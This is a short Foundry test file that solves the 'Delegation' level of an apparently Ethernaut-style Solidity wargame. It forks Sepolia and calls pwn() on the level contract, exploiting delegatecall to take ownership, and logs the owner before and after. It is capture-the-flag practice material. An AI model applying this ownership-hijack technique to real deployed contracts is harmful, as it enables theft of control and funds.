// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/06-Delegation/Delegation.sol";

contract ContractTest is Test {
 
    Delegation level6 = Delegation(payable(0xb143cdA4442f9C8a0100c37c0C0727bFDe8EBC81));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit6() public {
    console.log("Current owner is: ", level6.owner());
    (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
    assertEq(success, true);
    console.log("New owner is :", level6.owner());

    }
  receive() external payable {}
}